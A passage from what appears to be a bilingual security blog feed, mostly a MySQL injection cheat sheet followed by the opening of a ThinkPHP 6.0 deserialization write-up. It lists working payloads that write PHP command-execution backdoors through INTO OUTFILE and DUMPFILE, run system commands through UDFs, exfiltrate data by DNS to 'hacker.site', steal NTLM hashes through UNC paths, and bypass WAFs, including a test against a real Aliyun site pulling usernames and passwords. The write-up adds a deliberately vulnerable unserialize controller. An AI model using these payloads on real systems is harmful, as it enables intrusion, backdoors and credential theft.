<h2 id="MYSQL-Write-a-shell"><a href="#MYSQL-Write-a-shell" class="headerlink" title="MYSQL Write a shell"></a>MYSQL Write a shell</h2><h3 id="Into-outfile-method"><a href="#Into-outfile-method" class="headerlink" title="Into outfile method"></a>Into outfile method</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">[...] <span class="keyword">UNION</span> <span class="keyword">SELECT</span> &quot;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot; <span class="keyword">into</span> outfile &quot;C:\\xampp\\htdocs\\backdoor.php&quot;</span><br><span class="line">[...] <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/x.php&#x27;</span> FIELDS TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span></span><br><span class="line">[...] <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">0x3c3f70687020706870696e666f28293b203f3e</span> <span class="keyword">into</span> outfile <span class="string">&#x27;C:\\wamp\\www\\pwnd.php&#x27;</span><span class="comment">-- -</span></span><br><span class="line">[...] <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,&quot;&lt;?php echo shell_exec($_GET[&#x27;cmd&#x27;]);?&gt;&quot;,<span class="number">6</span> <span class="keyword">into</span> OUTFILE <span class="string">&#x27;c:/inetpub/wwwroot/backdoor.php&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="Into-dumpfile-method"><a href="#Into-dumpfile-method" class="headerlink" title="Into dumpfile method"></a>Into dumpfile method</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">[...] <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">0</span>xPHP_PAYLOAD_IN_HEX, <span class="keyword">NULL</span>, <span class="keyword">NULL</span> <span class="keyword">INTO</span> DUMPFILE <span class="string">&#x27;C:/Program Files/EasyPHP-12.1/www/shell.php&#x27;</span></span><br><span class="line">[...] <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e</span> <span class="keyword">INTO</span> DUMPFILE <span class="string">&#x27;/var/www/html/images/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="MYSQL-Fast-Exploitation"><a href="#MYSQL-Fast-Exploitation" class="headerlink" title="MYSQL Fast Exploitation"></a>MYSQL Fast Exploitation</h2><p>Requirement: MySQL &gt;&#x3D; 5.7.22</p>
<p>Use json_arrayagg() instead of group_concat() which allows less symbols to be displayed</p>
<ul>
<li>group_concat() &#x3D; 1024 symbols</li>
<li>json_arrayagg() &gt; 16,000,000 symbols<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">json_arrayagg</span>(concat_ws(<span class="number">0x3a</span>,table_schema,table_name)) <span class="keyword">from</span> INFORMATION_SCHEMA.TABLES;</span><br></pre></td></tr></table></figure>
<h2 id="MYSQL-UDF-command-execution"><a href="#MYSQL-UDF-command-execution" class="headerlink" title="MYSQL UDF command execution"></a>MYSQL UDF command execution</h2>First you need to check if the UDF are installed on the server.</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$ whereis lib_mysqludf_sys.so</span><br><span class="line"><span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>lib_mysqludf_sys.so</span><br></pre></td></tr></table></figure>
<p>Then you can use functions such as sys_exec and sys_eval.</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$ mysql <span class="operator">-</span>u root <span class="operator">-</span>p mysql</span><br><span class="line">Enter password: [...]</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> sys_eval(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> sys_eval(<span class="string">&#x27;id&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> uid<span class="operator">=</span><span class="number">118</span>(mysql) gid<span class="operator">=</span><span class="number">128</span>(mysql) <span class="keyword">groups</span><span class="operator">=</span><span class="number">128</span>(mysql) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------+</span></span><br></pre></td></tr></table></figure>
<h1 id="MYSQL-Out-of-band"><a href="#MYSQL-Out-of-band" class="headerlink" title="MYSQL Out of band"></a>MYSQL Out of band</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> @<span class="variable">@version</span> <span class="keyword">into</span> outfile <span class="string">&#x27;\\\\192.168.0.100\\temp\\out.txt&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> @<span class="variable">@version</span> <span class="keyword">into</span> dumpfile <span class="string">&#x27;\\\\192.168.0.100\\temp\\out.txt</span></span><br></pre></td></tr></table></figure>
<h3 id="DNS-exfiltration"><a href="#DNS-exfiltration" class="headerlink" title="DNS exfiltration"></a>DNS exfiltration</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> load_file(concat(<span class="string">&#x27;\\\\&#x27;</span>,version(),<span class="string">&#x27;.hacker.site\\a.txt&#x27;</span>));</span><br><span class="line"><span class="keyword">select</span> load_file(concat(<span class="number">0x5c5c5c5c</span>,version(),<span class="number">0x2e6861636b65722e736974655c5c612e747874</span>))</span><br></pre></td></tr></table></figure>
<h3 id="UNC-Path-NTLM-hash-stealing"><a href="#UNC-Path-NTLM-hash-stealing" class="headerlink" title="UNC Path - NTLM hash stealing"></a>UNC Path - NTLM hash stealing</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> load_file(<span class="string">&#x27;\\\\error\\abc&#x27;</span>);</span><br><span class="line"><span class="keyword">select</span> load_file(<span class="number">0x5c5c5c5c6572726f725c5c616263</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;osanda&#x27;</span> <span class="keyword">into</span> dumpfile <span class="string">&#x27;\\\\error\\abc&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;osanda&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;\\\\error\\abc&#x27;</span>;</span><br><span class="line">load data infile <span class="string">&#x27;\\\\error\\abc&#x27;</span> <span class="keyword">into</span> <span class="keyword">table</span> database.table_name;</span><br></pre></td></tr></table></figure>

<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p><strong>Learn here different options to</strong> <a href="mysql-ssrf.md"><strong>abuse a Mysql injection to obtain a SSRF</strong></a><strong>.</strong></p>
<h2 id="WAF-bypass-tricks"><a href="#WAF-bypass-tricks" class="headerlink" title="WAF bypass tricks"></a>WAF bypass tricks</h2><h3 id="Information-schema-alternatives"><a href="#Information-schema-alternatives" class="headerlink" title="Information_schema alternatives"></a>Information_schema alternatives</h3><p>Remember that in “modern” versions of <strong>MySQL</strong> you can substitute <em><strong>information_schema.tables</strong></em> for <em><strong>mysql.innodb_table_stats</strong></em>** ** or for <em><strong>sys.x$schema_flattened_keys</strong></em> or for <strong>sys.schema_table_statistics</strong></p>
<p><img src="/../../../.gitbook/assets/image%20(154).png"></p>
<p><img src="/../../../.gitbook/assets/image%20(155).png"></p>
<h3 id="MySQLinjection-without-COMMAS"><a href="#MySQLinjection-without-COMMAS" class="headerlink" title="MySQLinjection without COMMAS"></a>MySQLinjection without COMMAS</h3><p>Select 2 columns without using any comma (<a href="https://security.stackexchange.com/questions/118332/how-make-sql-select-query-without-comma">https://security.stackexchange.com/questions/118332/how-make-sql-select-query-without-comma</a>):</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select * from (select 1)UT1 JOIN (SELECT table_name FROM mysql.innodb_table_stats)UT2 on 1=1#</span><br></pre></td></tr></table></figure>

<p>使用 OFFSET、FROM 和 JOIN 绕过</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">LIMIT <span class="number">0</span>,<span class="number">1</span>         <span class="operator">-</span><span class="operator">&gt;</span> LIMIT <span class="number">1</span> <span class="keyword">OFFSET</span> <span class="number">0</span></span><br><span class="line">SUBSTR(<span class="string">&#x27;SQL&#x27;</span>,<span class="number">1</span>,<span class="number">1</span>) <span class="operator">-</span><span class="operator">&gt;</span> SUBSTR(<span class="string">&#x27;SQL&#x27;</span> <span class="keyword">FROM</span> <span class="number">1</span> <span class="keyword">FOR</span> <span class="number">1</span>).</span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="number">1</span>)a <span class="keyword">JOIN</span> (<span class="keyword">SELECT</span> <span class="number">2</span>)b <span class="keyword">JOIN</span> (<span class="keyword">SELECT</span> <span class="number">3</span>)c <span class="keyword">JOIN</span> (<span class="keyword">SELECT</span> <span class="number">4</span>)d</span><br></pre></td></tr></table></figure>

<p><code>IF</code> 语句中等号被过滤</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="keyword">case</span> <span class="keyword">when</span></span><br><span class="line"><span class="keyword">select</span> password <span class="keyword">from</span> finecms.fn_member <span class="keyword">where</span> uid <span class="operator">=</span> <span class="keyword">case</span> <span class="keyword">when</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>; </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> +----------------------------------+</span></span><br><span class="line"><span class="comment">  | password                         |</span></span><br><span class="line"><span class="comment">  +----------------------------------+</span></span><br><span class="line"><span class="comment">  | ac7cd59472be180b81c7551b92925f03 |</span></span><br><span class="line"><span class="comment">  +----------------------------------+</span></span><br><span class="line"><span class="comment">*/</span> </span><br></pre></td></tr></table></figure>

<h3 id="Extract-columns-name-without-information-schema"><a href="#Extract-columns-name-without-information-schema" class="headerlink" title="Extract columns name without information_schema"></a>Extract columns name without information_schema</h3><p><strong>Method for MySQL &gt;&#x3D; 4.1.</strong></p>
<p>First extract the column number with</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span>(<span class="number">1</span>)<span class="keyword">and</span>(<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> db.users)<span class="operator">=</span>(<span class="number">1</span>)</span><br><span class="line"><span class="comment">-- Operand should contain 4 column(s)</span></span><br></pre></td></tr></table></figure>
<p><strong>Then extract the column name.</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>) <span class="operator">=</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> db.users <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> LIMIT <span class="number">1</span>)</span><br><span class="line"><span class="comment">--Column &#x27;id&#x27; cannot be null</span></span><br></pre></td></tr></table></figure>

<p>Method for MySQL 5</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#同表相加查询，由于字段重复，会导致报错泄露字段名，同时通过 <span class="keyword">using</span> 函数可忽略联表查询中相同的字段，从而可通过该方式结合MySQL报错信息一个接一个泄露字段名</span><br><span class="line"><span class="number">-1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">JOIN</span> users b)a</span><br><span class="line"><span class="comment">--#1060 - Duplicate column name &#x27;id&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="number">-1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">JOIN</span> users b <span class="keyword">USING</span>(id))a</span><br><span class="line"><span class="comment">-- #1060 - Duplicate column name &#x27;name&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="number">-1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">JOIN</span> users b <span class="keyword">USING</span>(id,name))a</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h3 id="Retrieving-values-without-the-column-name"><a href="#Retrieving-values-without-the-column-name" class="headerlink" title="Retrieving values without the column name"></a>Retrieving values without the column name</h3><p>If at some point you know the name of the table but you don’t know the name of the columns inside the table, you can try to find how may columns are there executing something like:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># When a True is returned, you have found the number of columns</span></span><br><span class="line">select (select <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>) = (SELECT * from demo <span class="built_in">limit</span> 1);     <span class="comment"># 2columns</span></span><br><span class="line">select (select <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>) &lt; (SELECT * from demo <span class="built_in">limit</span> 1); <span class="comment"># 3columns</span></span><br></pre></td></tr></table></figure>

<p>Supposing there is 2 columns (being the first one the ID) and the other one the flag, you can try to bruteforce the content of the flag trying character by character:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># When True, you found the correct char and can start ruteforcing the next position</span></span><br><span class="line">select (select 1, <span class="string">&#x27;flaf&#x27;</span>) = (SELECT * from demo <span class="built_in">limit</span> 1);</span><br></pre></td></tr></table></figure>

<p>其他获取字段值的方式</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 这是一个包含 <span class="number">3</span> 列的<span class="keyword">sql</span>注入示例，将提取 dome 表的第三个字段,第一行的值</span><br><span class="line"><span class="number">-1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">0</span> , <span class="number">0</span> , <span class="number">0</span> , F<span class="number">.3</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="number">1</span> , <span class="number">2</span> , <span class="number">3</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> demo limit <span class="number">1</span>,<span class="number">2</span>)F;</span><br><span class="line"><span class="number">-1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">0</span> , <span class="number">0</span> , <span class="number">0</span> ,`<span class="number">3</span>` <span class="keyword">FROM</span> ( <span class="keyword">SELECT</span> <span class="number">1</span> , <span class="number">2</span> , <span class="number">3</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> demo limit <span class="number">1</span>,<span class="number">2</span>) F;</span><br><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> a<span class="number">.2</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="number">1</span> , <span class="number">2</span> , <span class="number">3</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> runoob_tbl)a limit <span class="number">1</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>或者如果目标系统支持堆叠注入，可以通过使用以下方式绕过限制（<code>column</code> ，<code>_</code> ， <code>information</code>，<code>select</code> 等）：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">78.46</span><span class="number">.224</span><span class="number">.75</span><span class="operator">/</span>quote<span class="operator">/</span><span class="number">2</span>;<span class="keyword">SET</span><span class="operator">%</span><span class="number">0</span>D<span class="variable">@sql</span><span class="operator">%</span><span class="number">3</span>d0x444f20736c656570283529;<span class="keyword">PREPARE</span><span class="operator">%</span><span class="number">0</span>Dquery<span class="operator">%</span><span class="number">0</span>DFROM<span class="operator">%</span><span class="number">0</span>D<span class="variable">@sql</span>;<span class="keyword">EXECUTE</span><span class="operator">%</span><span class="number">0</span>Dquery</span><br><span class="line"></span><br><span class="line"># <span class="keyword">SQL</span>语句原型：</span><br><span class="line"><span class="keyword">set</span> <span class="variable">@sql</span> <span class="operator">=</span> <span class="number">0x444f20736c656570283529</span>; # DO sleep(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">PREPARE</span> query <span class="keyword">FROM</span> <span class="variable">@sql</span>;</span><br><span class="line"><span class="keyword">EXECUTE</span> query;</span><br></pre></td></tr></table></figure>

<p>More info in <a href="https://medium.com/@terjanq/blind-sql-injection-without-an-in-1e14ba1d4952">https:&#x2F;&#x2F;medium.com&#x2F;@terjanq&#x2F;blind-sql-injection-without-an-in-1e14ba1d4952</a></p>
<h3 id="通用绕过"><a href="#通用绕过" class="headerlink" title="通用绕过"></a>通用绕过</h3><p><strong>大写&#x2F;小写绕过</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AnD</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">aNd</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#</span><br></pre></td></tr></table></figure>

<p><strong>等效运算符绕过</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">AND</span>   <span class="operator">-</span><span class="operator">&gt;</span> <span class="operator">&amp;&amp;</span> <span class="operator">-</span><span class="operator">&gt;</span> <span class="operator">%</span><span class="number">26</span><span class="operator">%</span><span class="number">26</span></span><br><span class="line"><span class="keyword">OR</span>    <span class="operator">-</span><span class="operator">&gt;</span> <span class="operator">||</span> <span class="operator">-</span><span class="operator">&gt;</span> <span class="operator">%</span><span class="number">7</span>C<span class="operator">%</span><span class="number">7</span>C</span><br><span class="line"><span class="operator">=</span>     <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">LIKE</span>,REGEXP,RLIKE, <span class="keyword">not</span> <span class="operator">&lt;</span> <span class="keyword">and</span> <span class="keyword">not</span> <span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&gt;</span> X   <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">not</span> <span class="keyword">between</span> <span class="number">0</span> <span class="keyword">and</span> X</span><br><span class="line"><span class="keyword">WHERE</span> <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">HAVING</span> <span class="comment">--&gt; LIMIT X,1 -&gt; group_concat(CASE(table_schema)When(database())Then(table_name)END) -&gt; group_concat(if(table_schema=database(),table_name,null))</span></span><br></pre></td></tr></table></figure>
<p><strong><code>select x</code> 绕过</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># [<span class="operator">+</span>]</span><br><span class="line"><span class="keyword">select</span><span class="operator">+</span>x <span class="keyword">from</span> y</span><br><span class="line"></span><br><span class="line"># [<span class="operator">-</span>]</span><br><span class="line"><span class="keyword">select</span><span class="operator">-</span>x <span class="keyword">from</span> y</span><br><span class="line"></span><br><span class="line"># [@]</span><br><span class="line"><span class="keyword">select</span><span class="variable">@x</span> <span class="keyword">from</span> y</span><br><span class="line"></span><br><span class="line"># [<span class="operator">!</span>]</span><br><span class="line"><span class="keyword">select</span><span class="operator">!</span>x <span class="keyword">from</span> y</span><br><span class="line"></span><br><span class="line"># [<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">select&#x27;</span>x<span class="string">&#x27; from y</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># [&quot;]</span></span><br><span class="line"><span class="string">select&quot;x&quot; from y</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># [~]</span></span><br><span class="line"><span class="string">select~x from y</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># [&#123;&#125;]</span></span><br><span class="line"><span class="string">select&#123;xxx x&#125; from y</span></span><br><span class="line"><span class="string">select&#123;xxx `x`&#125; from y</span></span><br><span class="line"><span class="string">select&#123;xxx `x`&#125;,.7from&#123;x `dbname`.`tablename`&#125;</span></span><br></pre></td></tr></table></figure>
<p><strong><code>union select x</code> 绕过</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># \N 绕过</span><br><span class="line"><span class="keyword">select</span> \N; # 代表<span class="keyword">null</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span>\Nunion <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,\N;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span>\Nunion <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,\Nfrom users;</span><br><span class="line"></span><br><span class="line"># <span class="keyword">union</span> <span class="keyword">distinct</span> <span class="keyword">select</span> 或 <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> 绕过</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">distinct</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> users;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">distinct</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,version() <span class="keyword">from</span> users;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> users;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,version() <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure>

<p>云 WAF 绕过测试</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 阿里云防火墙</span><br><span class="line"># MYSQL</span><br><span class="line">https:<span class="operator">/</span><span class="operator">/</span>edu.aliyun.com<span class="operator">/</span><span class="keyword">search</span>?q<span class="operator">=</span><span class="number">.8</span><span class="keyword">union</span><span class="comment">/*^%a0&#123;\a|^!!&#125;*/</span><span class="comment">/*select|\*!??@@-- /*/</span><span class="operator">*</span><span class="comment">-- %26%26^!~%*/select\N|!.7|1&amp;2%2%username,password from`finecms`.`fn_member` limit 1 offset 1-- # 整形注入</span></span><br><span class="line">https:<span class="operator">/</span><span class="operator">/</span>edu.aliyun.com<span class="operator">/</span><span class="keyword">search</span>?q<span class="operator">=</span><span class="number">.8</span><span class="string">&#x27;|/*^ /*/* -- */1/*??@|@--  %0b%0a-- %0a*/union/*^%a0&#123;\a|^!!&#125;*//*select|\*!??@@--%20/*/*--%20%26%26^!~%*/select\N|!.7|1&amp;2%2%username,password from`finecms`.`fn_member` limit 1 offset 1-- # 字符型注入</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># MSSQL</span></span><br><span class="line"><span class="string">https://edu.aliyun.com/?id=1.8&#x27;</span><span class="keyword">union</span><span class="comment">--^!~%*/%0b/*%0aselect\N|!.7|1&amp;2%2%username,password from`finecms`.`fn_member` limit 1 offset 1)--</span></span><br></pre></td></tr></table></figure>
<p><img src="/../../../.gitbook/assets/c9b31b5011e96ee6bdd2c5bd10e08dc3258e535f34655ed4e4ab54cdfd646253.png">  </p>
<h3 id="MySQL-history"><a href="#MySQL-history" class="headerlink" title="MySQL history"></a>MySQL history</h3><p>You ca see other executions inside the MySQL reading the table: <strong>sys.x$statement_analysis</strong></p>
<h3 id="Version-alternatives"><a href="#Version-alternatives" class="headerlink" title="Version alternatives"></a>Version alternative<strong>s</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select @@innodb_version;</span><br><span class="line">+------------------+</span><br><span class="line">| @@innodb_version |</span><br><span class="line">+------------------+</span><br><span class="line">| 5.6.31           |</span><br><span class="line">+------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select @@version;</span><br><span class="line">+-------------------------+</span><br><span class="line">| @@version               |</span><br><span class="line">+-------------------------+</span><br><span class="line">| 5.6.31-0ubuntu0.15.10.1 |</span><br><span class="line">+-------------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; mysql&gt; select version();</span><br><span class="line">+-------------------------+</span><br><span class="line">| version()               |</span><br><span class="line">+-------------------------+</span><br><span class="line">| 5.6.31-0ubuntu0.15.10.1 |</span><br><span class="line">+-------------------------+</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>ThinkPHP6.0.*反序列化漏洞-1</title>
    <url>/2022/03/19/ThinkPHP6-0-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/</url>
    <content><![CDATA[<h2 id="0x01-搭建环境"><a href="#0x01-搭建环境" class="headerlink" title="0x01-搭建环境"></a>0x01-搭建环境</h2><h3 id="官方安装教程：https-www-kancloud-cn-manual-thinkphp6-0-1037481"><a href="#官方安装教程：https-www-kancloud-cn-manual-thinkphp6-0-1037481" class="headerlink" title="官方安装教程：https://www.kancloud.cn/manual/thinkphp6_0/1037481"></a>官方安装教程：<a href="https://www.kancloud.cn/manual/thinkphp6_0/1037481">https://www.kancloud.cn/manual/thinkphp6_0/1037481</a></h3><h3 id="踩坑一"><a href="#踩坑一" class="headerlink" title="踩坑一"></a>踩坑一</h3><p>可能遇到的问题 composer 目录为空的情况，解决办法如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1. 切换到根目录、核心框架目录，更新。指令如下: </span></span><br><span class="line">composer update </span><br><span class="line"><span class="comment">#2. 更新composer自身，指令如下：</span></span><br><span class="line">composer seft-update</span><br></pre></td></tr></table></figure>

<h3 id="踩坑二"><a href="#踩坑二" class="headerlink" title="踩坑二"></a>踩坑二</h3><p>update 的时候提示：<code>Your requirements could not be resolved to an installable set of packages. </code>解决办法如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#composer 可以设置忽略版本匹配</span></span><br><span class="line">composer update --ignore-platform-reqs</span><br></pre></td></tr></table></figure>

<h2 id="0x02-利用条件"><a href="#0x02-利用条件" class="headerlink" title="0x02-利用条件"></a>0x02-利用条件</h2><p>利用条件为存在 <code>unserialize()</code> 函数且参数可控。手动创造条件验证漏洞，在Index控制器中写入：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;whoami&#x27;</span>]);   <span class="comment">// 参数可控的unserialize函数</span></span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Welcome to ThinkPHP!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="0x03-构造POP"><a href="#0x03-构造POP" class="headerlink" title="0x03-构造POP"></a>0x03-构造POP</h2><p>反序列化漏洞起点通常为  <code>__destruct()</code> 及 <code>__wake()</code> 两个魔术函数，因为它们就是 <code>unserialize</code> 的触发点。</p>
